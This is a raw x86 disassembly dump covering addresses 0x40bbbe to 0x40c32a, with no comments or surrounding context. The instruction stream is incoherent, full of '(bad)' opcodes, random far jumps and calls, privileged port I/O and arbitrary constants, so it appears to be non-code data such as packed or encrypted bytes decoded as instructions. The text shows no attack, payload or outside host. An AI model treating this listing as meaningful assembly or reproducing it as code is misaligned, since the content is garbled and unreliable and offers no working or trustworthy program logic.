  40bbbe:	mov    ecx,ebx
  40bbc0:	xchg   BYTE PTR [ebx+0x4d689349],bh
  40bbc6:	mov    esp,0xf3dd938d
  40bbcb:	sahf   
  40bbcc:	or     ecx,ebx
  40bbce:	and    ecx,esi
  40bbd0:	(bad)  
  40bbd1:	sbb    al,BYTE PTR [esi]
  40bbd3:	or     ebx,DWORD PTR [edi+eax*8-0x27]
  40bbd7:	cmp    eax,0x84884994
  40bbdc:	and    DWORD PTR [esp+esi*8+0x23],edi
  40bbe0:	dec    ebx
  40bbe1:	xor    DWORD PTR [esi-0x5ace01e0],ebp
  40bbe7:	out    0x75,eax
  40bbe9:	into   
  40bbea:	adc    BYTE PTR [ecx],bh
  40bbec:	(bad)  
  40bbed:	jg     0x40bbb8
  40bbef:	push   0xd7ba498c
  40bbf4:	lock push edx
  40bbf6:	jns    0x40bc5c
  40bbf8:	push   eax
  40bbf9:	and    eax,DWORD PTR [edx]
  40bbfb:	and    bl,al
  40bbfd:	test   dl,bl
  40bbff:	cmp    BYTE PTR [esi+0x35],bh
  40bc02:	cdq    
  40bc03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc04:	not    BYTE PTR [ecx]
  40bc06:	aam    0x62
  40bc08:	stos   DWORD PTR es:[edi],eax
  40bc09:	jge    0x40bc84
  40bc0b:	stc    
  40bc0c:	popa   
  40bc0d:	pop    ds
  40bc0e:	lods   al,BYTE PTR ds:[esi]
  40bc0f:	push   ebx
  40bc10:	mov    eax,ds:0xd76e1fa9
  40bc15:	and    ebp,0x1d
  40bc18:	cmp    eax,0x81406708
  40bc1d:	nop
  40bc1e:	xor    eax,0xf2cc237a
  40bc23:	adc    DWORD PTR [edx],eax
  40bc25:	pop    esi
  40bc26:	mov    eax,ds:0x383c777a
  40bc2b:	push   edi
  40bc2c:	mov    bl,0xa8
  40bc2e:	push   0x76336f43
  40bc33:	popf   
  40bc34:	ds dec edx
  40bc36:	int3   
  40bc37:	jo     0x40bc13
  40bc39:	mov    ch,0x7a
  40bc3b:	jo     0x40bbf7
  40bc3d:	inc    esi
  40bc3e:	cmp    BYTE PTR [edi],dl
  40bc40:	add    esp,edx
  40bc42:	leave  
  40bc43:	repz dec ebp
  40bc45:	repnz cmp dh,dl
  40bc48:	push   esi
  40bc49:	mov    es,WORD PTR [edx+0x67cca5e]
  40bc4f:	xor    ecx,DWORD PTR ds:0x7630c6ea
  40bc55:	xchg   ebp,eax
  40bc56:	ror    BYTE PTR [ecx+0x72],0x3e
  40bc5a:	aaa    
  40bc5b:	mov    esi,0xb4d17252
  40bc60:	in     eax,0xbb
  40bc62:	loope  0x40bc75
  40bc64:	enter  0x5ebe,0x8a
  40bc68:	pop    ecx
  40bc69:	enter  0x2ae3,0x43
  40bc6d:	(bad)  
  40bc6e:	(bad)  
  40bc6f:	jmp    0xf434:0x86a1aae9
  40bc76:	nop
  40bc77:	cld    
  40bc78:	xchg   DWORD PTR [ecx+eax*4],esp
  40bc7b:	popf   
  40bc7c:	sbb    ah,ah
  40bc7e:	add    al,BYTE PTR [ecx-0xd]
  40bc81:	scas   al,BYTE PTR es:[edi]
  40bc82:	rcr    BYTE PTR [ebp+0x5214867e],cl
  40bc88:	cmp    al,0x4a
  40bc8a:	ret    0x3d2d
  40bc8d:	and    eax,0xdbec80b
  40bc92:	push   eax
  40bc93:	mov    al,bh
  40bc95:	fiadd  WORD PTR [ebx+0x35]
  40bc98:	das    
  40bc99:	xchg   BYTE PTR [edx-0x456e39dc],dh
  40bc9f:	adc    al,0x9a
  40bca1:	pop    ds
  40bca2:	dec    ebx
  40bca3:	sti    
  40bca4:	jne    0x40bc64
  40bca6:	push   edx
  40bca7:	mov    ds:0xfd76b86d,eax
  40bcac:	(bad)  
  40bcae:	mov    edi,0x55188ec5
  40bcb3:	mov    bh,0x61
  40bcb5:	shl    DWORD PTR [edi-0x28a02556],0xb5
  40bcbc:	aad    0x3
  40bcbe:	add    ch,BYTE PTR [eax]
  40bcc0:	lods   al,BYTE PTR ds:[esi]
  40bcc1:	mov    bh,0x39
  40bcc3:	outs   dx,BYTE PTR ds:[esi]
  40bcc4:	push   esi
  40bcc5:	in     eax,dx
  40bcc6:	xchg   ebp,eax
  40bcc7:	push   esp
  40bcc8:	cmp    eax,0x5b557a89
  40bccd:	mov    dl,0xd4
  40bccf:	add    eax,0x7e2ab921
  40bcd4:	push   0x256170e9
  40bcd9:	jg     0x40bc66
  40bcdb:	pop    eax
  40bcdc:	inc    ebp
  40bcdd:	push   ecx
  40bcde:	daa    
  40bcdf:	adc    dl,BYTE PTR [edx-0x4dd90e84]
  40bce5:	push   0xc
  40bce7:	pusha  
  40bce8:	mov    ecx,0x1174be0
  40bced:	ins    BYTE PTR es:[edi],dx
  40bcee:	push   ss
  40bcef:	nop
  40bcf0:	jns    0x40bce5
  40bcf2:	cmp    DWORD PTR [esi-0x5a],eax
  40bcf5:	ds mov ah,0x7f
  40bcf8:	pop    esp
  40bcf9:	sbb    eax,0xd5014cd7
  40bcfe:	mov    ch,0x36
  40bd00:	sahf   
  40bd01:	jle    0x40bd46
  40bd03:	sti    
  40bd04:	xchg   ebx,eax
  40bd05:	jmp    0x42a8:0x78ae27ba
  40bd0c:	xchg   ebx,eax
  40bd0d:	sbb    al,0x9e
  40bd0f:	fldenv [edx+eax*1-0x2729ec72]
  40bd16:	cli    
  40bd17:	stc    
  40bd18:	inc    esp
  40bd19:	mov    dl,0x4d
  40bd1b:	pop    ds
  40bd1c:	call   0xca58:0x3c2db6e5
  40bd23:	int    0xea
  40bd25:	fwait
  40bd26:	mov    BYTE PTR [ebp-0x1c],dh
  40bd29:	add    eax,0xd341114c
  40bd2e:	adc    eax,0xdbdce7b7
  40bd33:	push   ecx
  40bd34:	aas    
  40bd35:	fisubr WORD PTR [ecx+esi*2-0x11]
  40bd39:	lods   eax,DWORD PTR ds:[esi]
  40bd3a:	clc    
  40bd3b:	mov    ebx,0xc5d63e1a
  40bd40:	mov    WORD PTR [ecx-0x25bc9e3d],es
  40bd46:	sti    
  40bd47:	xlat   BYTE PTR ds:[ebx]
  40bd48:	ret    0xadb1
  40bd4b:	add    DWORD PTR [edi],edx
  40bd4d:	cdq    
  40bd4e:	dec    ecx
  40bd4f:	lods   eax,DWORD PTR ds:[esi]
  40bd50:	loopne 0x40bdb7
  40bd52:	ja     0x40bcfc
  40bd54:	retf   0x5d14
  40bd57:	pop    edi
  40bd58:	push   esi
  40bd59:	(bad)  
  40bd5a:	cdq    
  40bd5b:	out    dx,eax
  40bd5c:	ins    DWORD PTR es:[edi],dx
  40bd5d:	push   cs
  40bd5e:	or     ebx,esi
  40bd60:	push   edi
  40bd61:	sub    eax,0x1dd7567c
  40bd66:	repnz repz sub edx,DWORD PTR [eax]
  40bd6a:	push   ebp
  40bd6b:	xchg   esi,eax
  40bd6c:	push   es
  40bd6d:	xchg   ebp,eax
  40bd6e:	mov    esi,0xfb53d141
  40bd73:	push   ds
  40bd74:	(bad)  
  40bd75:	rcl    DWORD PTR [ebx+0x14683c24],cl
  40bd7b:	cmp    BYTE PTR [eax-0x2bae79f4],0x12
  40bd82:	dec    ebp
  40bd83:	loopne 0x40bd4e
  40bd85:	cld    
  40bd86:	mov    cl,0x4
  40bd88:	xchg   ecx,eax
  40bd89:	mov    bh,0x47
  40bd8b:	mov    cl,0x34
  40bd8d:	cmp    bh,BYTE PTR [edx+0x5b289556]
  40bd93:	cmp    eax,0x5803b153
  40bd98:	div    DWORD PTR ds:0x1f9d2064
  40bd9e:	cmp    BYTE PTR [eax],al
  40bda0:	sahf   
  40bda1:	adc    al,0x6c
  40bda3:	outs   dx,BYTE PTR ds:[esi]
  40bda4:	das    
  40bda5:	loop   0x40be13
  40bda7:	(bad)  
  40bda8:	cdq    
  40bda9:	and    eax,0xceeb9af
  40bdae:	push   ecx
  40bdaf:	mov    WORD PTR [esi+0x28],es
  40bdb2:	imul   DWORD PTR [esp+eax*1-0x59]
  40bdb6:	dec    eax
  40bdb7:	sbb    BYTE PTR ds:0x1e3464c6,ch
  40bdbd:	in     al,0xd4
  40bdbf:	ret    0x9923
  40bdc2:	cmp    ah,ah
  40bdc4:	pop    esp
  40bdc5:	jns    0x40bdba
  40bdc7:	sub    eax,0xbab1045a
  40bdcc:	push   ebx
  40bdcd:	or     cl,dh
  40bdcf:	gs inc ebp
  40bdd1:	push   es
  40bdd2:	sbb    DWORD PTR [eax],0x99bcd0be
  40bdd8:	std    
  40bdd9:	dec    ebp
  40bdda:	inc    edx
  40bddb:	aam    0x8a
  40bddd:	cwde   
  40bdde:	scas   al,BYTE PTR es:[edi]
  40bddf:	xor    eax,0xf3118acf
  40bde4:	mov    ss,WORD PTR [ebx-0x24]
  40bde7:	push   ecx
  40bde8:	push   edi
  40bde9:	sbb    eax,0x70614a21
  40bdee:	mov    WORD PTR [ebp+0x37],ds
  40bdf1:	jae    0x40be0e
  40bdf3:	lods   al,BYTE PTR ds:[esi]
  40bdf4:	test   eax,0xe3874983
  40bdf9:	xchg   edx,eax
  40bdfa:	mov    ecx,0x8b6d3b2a
  40bdff:	push   esi
  40be00:	inc    eax
  40be01:	cmp    ebp,DWORD PTR [ebx-0x594910a5]
  40be07:	mov    dl,0xd9
  40be09:	adc    ah,BYTE PTR [edi-0x1338f0b6]
  40be0f:	stos   BYTE PTR es:[edi],al
  40be10:	(bad)  
  40be11:	pop    esi
  40be12:	xor    DWORD PTR [edi-0x48404a66],0xd15d95b4
  40be1c:	pop    ecx
  40be1d:	ds jno 0x40be1b
  40be20:	jne    0x40be06
  40be22:	push   0x1bbeb172
  40be27:	xchg   esi,eax
  40be28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be2a:	sub    al,0x3d
  40be2c:	aaa    
  40be2d:	sbb    al,0x4e
  40be2f:	cmp    DWORD PTR [esi+0x53b947a9],0x27
  40be36:	sbb    esp,DWORD PTR [eax]
  40be38:	frstor [esi+0x39124874]
  40be3e:	xchg   ebp,eax
  40be3f:	jb     0x40bddc
  40be41:	pop    esi
  40be42:	inc    eax
  40be43:	push   ecx
  40be44:	arpl   di,cx
  40be46:	mov    esi,0x37c096d3
  40be4b:	dec    eax
  40be4c:	cld    
  40be4d:	fadd   DWORD PTR [ecx+0x25]
  40be50:	(bad)  
  40be52:	jns    0x40bebd
  40be54:	jmp    0x912d:0xa1d8f9db
  40be5b:	repnz or eax,0xacdfb0d0
  40be61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be62:	jg     0x40bde8
  40be64:	scas   al,BYTE PTR es:[edi]
  40be65:	out    dx,eax
  40be66:	test   bh,dl
  40be68:	jmp    0x4931e4b9
  40be6d:	and    al,0xc8
  40be6f:	(bad)  
  40be70:	jae    0x40be35
  40be72:	aaa    
  40be73:	or     esp,DWORD PTR [ecx]
  40be75:	jmp    0xfbb3:0xe316c2bd
  40be7c:	retf   
  40be7d:	lahf   
  40be7e:	imul   eax,ebp,0xe1a2e9a7
  40be84:	pop    ds
  40be85:	hlt    
  40be86:	xchg   ebp,eax
  40be87:	push   edi
  40be88:	mov    dh,0xc7
  40be8a:	sub    BYTE PTR [edi+0x55],0x67
  40be8e:	int    0xb5
  40be90:	ret    
  40be91:	sbb    al,BYTE PTR [ebx]
  40be93:	xchg   BYTE PTR [ecx],cl
  40be95:	push   es
  40be96:	outs   dx,BYTE PTR ds:[esi]
  40be97:	or     esi,0xb
  40be9a:	push   cs
  40be9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be9c:	mov    WORD PTR [eax],?
  40be9e:	fs loope 0x40be75
  40bea1:	fwait
  40bea2:	jbe    0x40becd
  40bea4:	add    eax,0xdde25b31
  40bea9:	mov    bl,0xb3
  40beab:	dec    esp
  40beac:	sbb    esi,edi
  40beae:	out    0x15,al
  40beb0:	and    cl,al
  40beb2:	cld    
  40beb3:	pop    ecx
  40beb4:	sbb    al,0x1b
  40beb6:	mov    al,0x3
  40beb8:	sbb    al,0x43
  40beba:	add    eax,0x4f328575
  40bebf:	sti    
  40bec0:	cs mov cl,0x6
  40bec3:	imul   ebx,DWORD PTR [ebx-0x62],0xffffff9b
  40bec7:	mov    BYTE PTR [ecx],cl
  40bec9:	push   DWORD PTR [ebp+0x1f]
  40becc:	xchg   ebx,eax
  40becd:	sub    BYTE PTR [ebp+0x7a],bl
  40bed0:	gs int3 
  40bed2:	sbb    eax,0x7c6ef060
  40bed7:	cdq    
  40bed8:	sti    
  40bed9:	iret   
  40beda:	clc    
  40bedb:	xchg   edi,eax
  40bedc:	(bad)  
  40bedd:	mov    bl,0x6f
  40bedf:	mov    ds:0x9e94dadf,eax
  40bee4:	xchg   edi,eax
  40bee5:	dec    ebp
  40bee6:	inc    eax
  40bee7:	ins    DWORD PTR es:[edi],dx
  40bee8:	stos   BYTE PTR es:[edi],al
  40bee9:	push   eax
  40beea:	cdq    
  40beeb:	in     eax,0x24
  40beed:	int    0x13
  40beef:	dec    eax
  40bef0:	mov    edi,DWORD PTR [eax-0xf]
  40bef3:	pop    esi
  40bef4:	ja     0x40bf52
  40bef6:	lods   al,BYTE PTR ds:[esi]
  40bef7:	xchg   ecx,eax
  40bef8:	std    
  40bef9:	aas    
  40befa:	aas    
  40befb:	xchg   esi,eax
  40befc:	sahf   
  40befd:	cmp    DWORD PTR [ebp-0x1d],esp
  40bf00:	inc    ebx
  40bf01:	cs ins DWORD PTR es:[edi],dx
  40bf03:	pop    esp
  40bf04:	mov    dh,0xcc
  40bf06:	or     DWORD PTR [edx-0x29],eax
  40bf09:	out    dx,al
  40bf0a:	xchg   esp,eax
  40bf0b:	imul   esp,eax,0xf4a34231
  40bf11:	test   esp,0xcba16e41
  40bf17:	retf   0xa40d
  40bf1a:	jmp    0x377796cb
  40bf1f:	data16 (bad) 
  40bf21:	stc    
  40bf22:	adc    dl,ch
  40bf24:	retf   0x1612
  40bf27:	jp     0x40bf28
  40bf29:	and    eax,0x7a1e4b68
  40bf2e:	test   cl,dl
  40bf30:	and    eax,0x2a6ff21
  40bf35:	jmp    0xf0058362
  40bf3a:	jmp    0x41e3:0x6b0679f0
  40bf41:	out    dx,eax
  40bf42:	inc    edx
  40bf43:	jbe    0x40bf73
  40bf45:	dec    esi
  40bf46:	add    bl,BYTE PTR [eax]
  40bf48:	push   ebx
  40bf49:	and    edi,DWORD PTR [edx]
  40bf4b:	sahf   
  40bf4c:	lods   al,BYTE PTR ds:[esi]
  40bf4d:	mov    bl,BYTE PTR [ecx-0x21f5110d]
  40bf53:	scas   al,BYTE PTR es:[edi]
  40bf54:	jl     0x40beea
  40bf56:	addr16 inc esp
  40bf58:	xchg   edx,eax
  40bf59:	adc    eax,0xa4bf109f
  40bf5e:	stos   DWORD PTR es:[edi],eax
  40bf5f:	sub    eax,0x1a0effef
  40bf64:	cmp    esi,DWORD PTR [edx-0x72]
  40bf67:	je     0x40bf28
  40bf69:	xor    dl,0x30
  40bf6c:	push   ss
  40bf6d:	(bad)  
  40bf6f:	xchg   ebx,eax
  40bf70:	dec    ebp
  40bf71:	push   esi
  40bf72:	mov    fs,WORD PTR [eax+0x3773c533]
  40bf78:	sbb    esp,DWORD PTR [ecx+0x42aaa2f8]
  40bf7e:	icebp  
  40bf7f:	or     DWORD PTR [edi-0x7a85c85f],edx
  40bf85:	push   0x7
  40bf87:	or     ebp,DWORD PTR ds:0x56cedbac
  40bf8d:	loopne 0x40bf74
  40bf8f:	hlt    
  40bf90:	or     eax,0x87165452
  40bf95:	cwde   
  40bf96:	je     0x40bfbe
  40bf98:	fdiv   QWORD PTR [ebp-0x40]
  40bf9b:	mov    bh,0x2b
  40bf9d:	or     DWORD PTR [edi+0x44794d73],edi
  40bfa3:	(bad)  
  40bfa4:	lea    esi,[eax]
  40bfa6:	mov    dl,0xab
  40bfa8:	dec    ebp
  40bfa9:	(bad)  
  40bfaa:	gs xchg ebp,eax
  40bfac:	mov    esp,0x97639f47
  40bfb1:	ret    0xb517
  40bfb4:	lea    ebp,ds:0x4b095ee
  40bfba:	mov    ebx,0xd830a4b7
  40bfbf:	fimul  DWORD PTR [edi+edi*8-0x57c07500]
  40bfc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfc7:	in     eax,dx
  40bfc8:	lahf   
  40bfc9:	and    al,0x3b
  40bfcb:	cdq    
  40bfcc:	imul   ebx,esp,0xffffffd5
  40bfcf:	dec    ecx
  40bfd0:	xchg   edi,eax
  40bfd1:	sub    ebx,DWORD PTR [esi+0x6e323366]
  40bfd7:	xchg   DWORD PTR [ebx+0x1ae9d59f],edx
  40bfdd:	inc    ebp
  40bfde:	jbe    0x40bfae
  40bfe0:	inc    esi
  40bfe1:	push   edi
  40bfe2:	into   
  40bfe3:	add    eax,ebp
  40bfe5:	pop    es
  40bfe6:	and    bl,BYTE PTR [edi]
  40bfe8:	mov    ds:0x5110f90c,eax
  40bfed:	adc    al,dl
  40bfef:	add    ah,0x4b
  40bff2:	push   ss
  40bff3:	mov    al,ds:0x98976e1d
  40bff8:	daa    
  40bff9:	inc    edx
  40bffa:	aas    
  40bffb:	inc    edx
  40bffc:	cli    
  40bffd:	mov    ah,0x60
  40bfff:	mov    DWORD PTR [ecx-0x7b6f6c20],esi
  40c005:	daa    
  40c006:	int    0xbc
  40c008:	repnz lods eax,DWORD PTR ds:[esi]
  40c00a:	sahf   
  40c00b:	sub    eax,0xa2faea30
  40c010:	arpl   WORD PTR [ecx-0x44],bp
  40c013:	mov    dl,0xc1
  40c015:	push   eax
  40c016:	stos   DWORD PTR es:[edi],eax
  40c017:	mov    ebx,0x2aac3414
  40c01c:	xchg   esi,eax
  40c01d:	jle    0x40bfb4
  40c01f:	fs dec edi
  40c021:	adc    al,0xbe
  40c023:	fldln2 
  40c025:	iret   
  40c026:	xchg   ebx,eax
  40c027:	call   0xfacc:0xec5fe27a
  40c02e:	cmc    
  40c02f:	pusha  
  40c030:	inc    ebp
  40c031:	retf   
  40c032:	xor    BYTE PTR [edx-0x4538f88b],al
  40c038:	test   ebp,0xd02d335b
  40c03e:	adc    DWORD PTR [eax-0x4caddd2a],0xffffff9e
  40c045:	push   ebp
  40c046:	data16 and al,BYTE PTR [ecx+0x5f]
  40c04a:	cdq    
  40c04b:	pop    ds
  40c04c:	jl     0x40bfce
  40c04e:	dec    esp
  40c04f:	mov    eax,DWORD PTR ds:0x3ff28144
  40c055:	xchg   ecx,eax
  40c056:	sbb    al,0x34
  40c059:	shr    dh,cl
  40c05b:	(bad)
  40c05e:	clc    
  40c05f:	pusha  
  40c060:	out    dx,eax
  40c061:	icebp  
  40c062:	xor    ah,bh
  40c064:	bound  edi,QWORD PTR [ebx]
  40c066:	or     bl,dh
  40c068:	call   0x8c7e:0xff844377
  40c06f:	cmp    ebp,DWORD PTR [ebp+0x57]
  40c072:	aas    
  40c073:	pop    esi
  40c074:	xlat   BYTE PTR ds:[ebx]
  40c075:	add    eax,0x85be57b9
  40c07a:	push   edx
  40c07b:	jbe    0x40c00d
  40c07d:	jo     0x40c0cb
  40c07f:	popa   
  40c080:	cmp    ah,0x70
  40c083:	daa    
  40c084:	sbb    ecx,DWORD PTR [eax+0x37]
  40c087:	jno    0x40c0c6
  40c089:	push   edi
  40c08a:	retf   0xe1a3
  40c08d:	mov    BYTE PTR [edx-0x4a],0x22
  40c091:	and    dl,dl
  40c093:	scas   eax,DWORD PTR es:[edi]
  40c094:	cmp    eax,0x53836e99
  40c099:	js     0x40c0d9
  40c09b:	xchg   esi,eax
  40c09c:	retf   
  40c09d:	mov    edx,0x88d67a8b
  40c0a2:	int3   
  40c0a3:	sbb    BYTE PTR [esi+0x74aace69],0xf2
  40c0aa:	mov    al,ds:0x6a3c3079
  40c0af:	ret    0x4007
  40c0b2:	jo     0x40c08d
  40c0b4:	test   DWORD PTR [ecx-0x57d5ac6],ecx
  40c0ba:	popa   
  40c0bb:	(bad)  
  40c0bc:	jp     0x40c112
  40c0be:	outs   dx,DWORD PTR ds:[esi]
  40c0bf:	(bad)  
  40c0c1:	fnstsw WORD PTR ds:0x7eb53910
  40c0c7:	icebp  
  40c0c8:	cmp    ebp,edi
  40c0ca:	test   eax,0x16c32030
  40c0cf:	or     esi,eax
  40c0d1:	adc    al,0x16
  40c0d3:	nop    edi
  40c0d6:	(bad)  
  40c0d7:	sahf   
  40c0d8:	ficom  DWORD PTR [ecx]
  40c0da:	push   es
  40c0db:	or     dl,bh
  40c0dd:	stc    
  40c0de:	jne    0x40c14d
  40c0e0:	xor    BYTE PTR [edi],0x78
  40c0e3:	cmp    al,0x9f
  40c0e5:	out    0x49,eax
  40c0e7:	jle    0x40c0e9
  40c0e9:	mov    dl,0x81
  40c0eb:	xor    DWORD PTR es:[ebx],ebx
  40c0ee:	cld    
  40c0ef:	mov    DWORD PTR [edx-0x660fbd4e],edi
  40c0f5:	inc    ebx
  40c0f6:	enter  0x17d9,0xab
  40c0fa:	cmc    
  40c0fb:	sbb    eax,0xab8e7d1e
  40c100:	shl    DWORD PTR [esi-0x61],1
  40c103:	aaa    
  40c104:	adc    BYTE PTR [ecx],ah
  40c106:	in     eax,0x28
  40c108:	fsubrp st(4),st
  40c10a:	test   eax,0xc40dcdcd
  40c10f:	outs   dx,DWORD PTR ds:[esi]
  40c110:	(bad)  
  40c111:	arpl   WORD PTR [ecx-0x18],si
  40c114:	ret    0x5ec7
  40c117:	stos   DWORD PTR es:[edi],eax
  40c118:	or     eax,0x32f65cb4
  40c11d:	or     al,0xb8
  40c11f:	leave  
  40c120:	push   ebx
  40c121:	mov    ebx,0xa80823a4
  40c126:	or     eax,0xcabf683f
  40c12b:	adc    BYTE PTR [edx-0x73c5455f],bh
  40c131:	(bad)  
  40c132:	mov    al,ah
  40c134:	sub    BYTE PTR [ecx],dh
  40c136:	sub    edx,0xb37abf29
  40c13c:	ins    BYTE PTR es:[edi],dx
  40c13d:	div    DWORD PTR [edx-0x51624927]
  40c143:	js     0x40c140
  40c145:	jecxz  0x40c177
  40c147:	fiadd  DWORD PTR [ecx]
  40c149:	aas    
  40c14a:	mov    eax,ds:0xf8dea7b3
  40c14f:	mov    ds,ebp
  40c151:	mov    eax,ds:0x418881b6
  40c156:	lods   al,BYTE PTR ds:[esi]
  40c157:	push   edx
  40c158:	gs int 0x1a
  40c15b:	xor    al,0xdc
  40c15d:	fbstp  TBYTE PTR [edi]
  40c15f:	fstp   TBYTE PTR [edx+edi*4+0x192afd9a]
  40c166:	mov    WORD PTR [ebp+0x46d548a3],?
  40c16c:	or     dl,dh
  40c16e:	jo     0x40c128
  40c170:	xchg   esi,eax
  40c171:	neg    DWORD PTR [ecx-0x555bec6e]
  40c177:	add    esp,DWORD PTR [edx]
  40c179:	pop    esi
  40c17a:	or     al,0x4a
  40c17c:	mov    esi,0xa591ca04
  40c181:	xchg   esi,eax
  40c182:	add    DWORD PTR [edi],ebp
  40c184:	xor    ebx,ecx
  40c186:	rcl    DWORD PTR [esi+0x2d],0xae
  40c18a:	in     eax,dx
  40c18b:	and    al,0x2
  40c18d:	jns    0x40c204
  40c18f:	push   ds
  40c190:	call   0x553:0x856bea00
  40c197:	mov    cl,0xc7
  40c199:	mov    WORD PTR ds:0x6c8a7d77,ds
  40c19f:	sbb    eax,0xe5dc8f8d
  40c1a4:	rcr    BYTE PTR [ebx],cl
  40c1a6:	and    DWORD PTR [ecx],esp
  40c1a8:	cli    
  40c1a9:	gs dec ebx
  40c1ab:	or     ebx,DWORD PTR [ebx-0x30b41b56]
  40c1b1:	push   es
  40c1b2:	fimul  DWORD PTR ds:0x9113a48e
  40c1b8:	lea    edi,[ecx+0x34]
  40c1bb:	imul   eax,DWORD PTR [ebx+ecx*8],0x8
  40c1bf:	mov    ds:0xcb33cf83,al
  40c1c4:	pop    esi
  40c1c6:	push   cs
  40c1c7:	es push 0xffffff8f
  40c1ca:	push   ebp
  40c1cb:	lahf   
  40c1cc:	xchg   edi,eax
  40c1cd:	out    dx,eax
  40c1ce:	adc    eax,0x356da1da
  40c1d3:	push   es
  40c1d4:	(bad)  
  40c1d5:	and    DWORD PTR [esi-0x38],eax
  40c1d8:	push   ecx
  40c1d9:	jp     0x40c241
  40c1db:	jle    0x40c240
  40c1dd:	inc    ebx
  40c1de:	inc    esi
  40c1e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1e1:	hlt    
  40c1e2:	xchg   esp,eax
  40c1e3:	inc    ecx
  40c1e4:	jno    0x40c178
  40c1e6:	push   edi
  40c1e7:	adc    ebx,ecx
  40c1e9:	adc    eax,0xdf39b7af
  40c1ee:	test   ah,0xf4
  40c1f1:	call   0xecf6:0xba82b9fc
  40c1f8:	pop    edi
  40c1f9:	sbb    eax,0x6d7e5f52
  40c1fe:	and    eax,0xdfa4c711
  40c203:	xor    al,BYTE PTR ds:0xee28eab
  40c209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c20a:	and    al,0x3e
  40c20c:	iret   
  40c20d:	out    dx,al
  40c20e:	in     al,dx
  40c20f:	rcl    bl,0x76
  40c212:	cwde   
  40c213:	jmp    0x3f61:0xe29889b9
  40c21a:	in     al,0x6
  40c21c:	and    eax,DWORD PTR [esi]
  40c21e:	lods   eax,DWORD PTR ds:[esi]
  40c21f:	outs   dx,BYTE PTR ds:[esi]
  40c220:	inc    edx
  40c221:	pop    ebx
  40c222:	addr16 pop ss
  40c224:	out    0xf9,eax
  40c226:	sbb    DWORD PTR [ebx+ebp*8],edx
  40c229:	in     eax,dx
  40c22a:	cmc    
  40c22b:	add    al,0x63
  40c22d:	test   BYTE PTR [ecx+edx*2],0x36
  40c231:	test   BYTE PTR [edx+0x4f],bl
  40c234:	dec    edi
  40c235:	push   ds
  40c236:	adc    dh,BYTE PTR [eax+ebx*8+0x72]
  40c23a:	pop    ss
  40c23b:	push   ebp
  40c23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c23d:	lahf   
  40c23e:	in     eax,0xd6
  40c240:	sbb    ch,BYTE PTR [edi-0x32]
  40c243:	push   es
  40c244:	loopne 0x40c28d
  40c246:	cli    
  40c247:	aad    0x44
  40c249:	mov    al,ds:0x3c02112c
  40c24e:	mov    ds:0xa89679d8,eax
  40c253:	(bad)  
  40c254:	jno    0x40c21a
  40c256:	call   0x17c:0x980eafe5
  40c25d:	xchg   edi,eax
  40c25e:	mov    cl,0x1c
  40c260:	out    dx,eax
  40c261:	pop    ebp
  40c262:	in     eax,0x95
  40c264:	jo     0x40c201
  40c266:	cmp    eax,0xfd88281a
  40c26b:	adc    ebx,eax
  40c26d:	arpl   si,cx
  40c26f:	push   ss
  40c270:	ds inc esp
  40c272:	jae    0x40c231
  40c274:	loop   0x40c218
  40c276:	inc    esi
  40c277:	mov    eax,ds:0x82a93702
  40c27c:	jmp    0x4c34:0xa224c4d5
  40c283:	sbb    eax,0xd6ba13ad
  40c288:	xor    DWORD PTR [ebp+0x777fec87],edi
  40c28e:	or     BYTE PTR [edx],al
  40c290:	xor    ch,bl
  40c292:	enter  0xff6b,0xe8
  40c296:	and    dh,BYTE PTR [ebp+0x25]
  40c299:	lods   eax,DWORD PTR ds:[esi]
  40c29a:	(bad)  
  40c29b:	mov    al,ds:0xfaa57827
  40c2a0:	mov    ah,0x54
  40c2a2:	call   0xe4091a44
  40c2a7:	js     0x40c26b
  40c2a9:	scas   eax,DWORD PTR es:[edi]
  40c2aa:	adc    eax,esi
  40c2ac:	sbb    cl,bl
  40c2ae:	xor    BYTE PTR [ebx],0x90
  40c2b1:	pop    ecx
  40c2b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b3:	jmp    0x40c2ca
  40c2b5:	lahf   
  40c2b6:	lock es jnp 0x40c32d
  40c2ba:	rcl    esi,0xec
  40c2bd:	sub    esp,edx
  40c2bf:	lods   eax,DWORD PTR ds:[esi]
  40c2c0:	mov    ecx,0x2d89af52
  40c2c5:	cld    
  40c2c6:	(bad)  
  40c2c7:	mov    ecx,DWORD PTR [esi-0x29]
  40c2ca:	jae    0x40c289
  40c2cc:	jl     0x40c283
  40c2ce:	jp     0x40c33e
  40c2d0:	mov    al,0x12
  40c2d2:	pop    es
  40c2d3:	pop    edi
  40c2d4:	sar    BYTE PTR [eax],0x2d
  40c2d7:	test   DWORD PTR [eax],0xcfcb4117
  40c2dd:	mov    dl,0xf1
  40c2df:	or     eax,0x8e17c6e1
  40c2e4:	cmc    
  40c2e5:	lods   eax,DWORD PTR ds:[esi]
  40c2e6:	jmp    0xc5bc4721
  40c2eb:	jno    0x40c349
  40c2ed:	add    eax,0x6634d200
  40c2f2:	daa    
  40c2f3:	pushf  
  40c2f4:	pop    es
  40c2f5:	retf   0x642f
  40c2f8:	fisttp WORD PTR [edi+ecx*1-0x1b]
  40c2fc:	xchg   BYTE PTR [esi+0xdc2f863],cl
  40c302:	pop    ds
  40c303:	xor    esi,DWORD PTR [eax+0x0]
  40c306:	push   edx
  40c307:	and    bh,cl
  40c309:	push   ds
  40c30a:	fimul  DWORD PTR [eax]
  40c30c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c30d:	fdivr  st,st(2)
  40c30f:	mov    bl,0x2a
  40c311:	popf   
  40c312:	cmp    ch,BYTE PTR [esp+edi*8]
  40c315:	mov    bl,0x58
  40c317:	out    dx,al
  40c318:	ret    
  40c319:	stos   DWORD PTR es:[edi],eax
  40c31a:	daa    
  40c31b:	push   ebx
  40c31c:	mov    ecx,0x7f213269
  40c321:	ret    0xc369
  40c324:	inc    ebx
  40c325:	retf   0x6fd6
  40c328:	mov    al,0x3
  40c32a:	jg     0x40c352
